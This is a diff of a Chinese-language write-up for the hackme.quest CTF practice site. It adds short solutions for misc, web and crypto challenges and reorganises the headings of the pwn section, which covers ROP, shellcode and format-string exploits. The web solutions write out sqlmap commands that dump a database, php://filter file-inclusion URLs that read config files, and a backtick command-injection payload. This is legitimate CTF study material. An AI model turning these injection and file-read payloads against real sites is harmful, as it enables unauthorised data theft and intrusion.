@@ -1,6 +1,61 @@
 # HackMe Writeup
 
-# 57 catflag
+# Misc
+## 1 flag
+摁... flag就已經在那邊了
+
+## 2 corgi can fly
+用Stegsolve開起來後切到Red plane 0後掃QR code
+
+## 3 television
+用strings搜尋就出來了
+
+# Web
+## 15 hide and seek
+F12看原始碼
+
+## 16 guestbook
+載sqlmap之後先隨便送個post出去，然後從message list看到剛剛的post後觀察網址有注入點的可能性，丟到sqlmap 去跑
+
+python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dbs
+
+查資料庫料表
+
+python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --tables -D g8
+
+指定g8資料庫後查table表
+
+python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dump flag -D g8
+
+顯示資料，然後就有flag了
+
+## 17 LFI
+用php://filter/來讀檔案
+一開始先用
+
+https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/flag
+
+base64解碼後得到:"Can you read the flag<?php require('config.php'); ?>?"
+再用
+
+https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/config
+
+讀，base64解碼後就是flag了
+
+## 18 homepage
+按F12打開主控台掃描QR code
+
+## 19 ping
+反引號"\`"沒有在黑名單裡，可以利用這個來執行想要執行的其他指令
+先嘗試\`ls\`後得到有flag.php檔案
+再用\`sort \?\?\?\?\?\?\?\?\`得出內容
+
+## 20 scoreboard
+F12後換到網路，打開scoreboard的標頭，可以發現flag藏在x-flag裡
+
+
+# Pwn
+## 57 catflag
 就直接連上去就好了
 ```python=
 def main():
@@ -8,7 +63,7 @@ def main():
     r.interactive()
 ```
 
-# 58 homework
+## 58 homework
 從原始碼可以看出這個地方允許使用者修改任意位置的值
 
 ![image alt](https://i.imgur.com/3GEpGpV.png")
@@ -45,7 +100,7 @@ def main():
     r.interactive()
 ```
 
-# 59 ROP
+## 59 ROP
 checksec 一下後發現沒有開啟Canary和PIE，程式又有用gets來做讀取
 所以可以直接buffer overflow掉reutrn address
 但比較麻煩的是程式裡面沒有直接提供shell的function，所以得自己搞
@@ -101,7 +156,7 @@ def main():
 
     r.interactive()
 ```
-# 60 ROP2
+## 60 ROP2
 真正的ROP，沒辦法直接用ROPgadget來生成ROP chain了
 先觀察一下後發現在overflow函式中有呼叫3號的syscall
 
@@ -155,10 +210,10 @@ def main():
     r.interactive()
 ```
 
-# 61 toooomuch
+## 61 toooomuch
 反編譯一下知道passcode是43210之後輸入後玩猜數字遊戲後flag就出來了
 
-# 62 toooomuch-2
+## 62 toooomuch-2
 這題沒有開啟NX因此有可寫可執行的記憶體區段，可以用shell code來解
 可以先從[這裡](https://www.exploit-db.com/shellcodes)挑選一個合適的shell code，然後就可以來尋找可以寫入的區段了
 使用gdb的vmmap後會顯示出寫可執行的記憶體區段
@@ -186,7 +241,7 @@ def main():
     r.interactive()
 ```
 
-# 63 echo
+## 63 echo
 這題的核心概念是格式化字串攻擊，藉由printf寫入相關資訊，然後開啟shell
 除此之外，更用到了呼叫library函式的漏洞
 當程式執行到library function時，會跳轉到對應的plt，然後plt中會檢查該函式的got是否有被填上，若有則跳轉到該位置，執行library function，若否，則填上got後再執行。
@@ -211,3 +266,12 @@ def main():
 
     r.interactive()
 ```
+
+# Crypto
+
+## 81 easy
+先把hex值轉成ascii後再做base64解碼
+
+## 82 r u kidding
+[凱薩加密](https://www.dcode.fr/caesar-cipher)
+
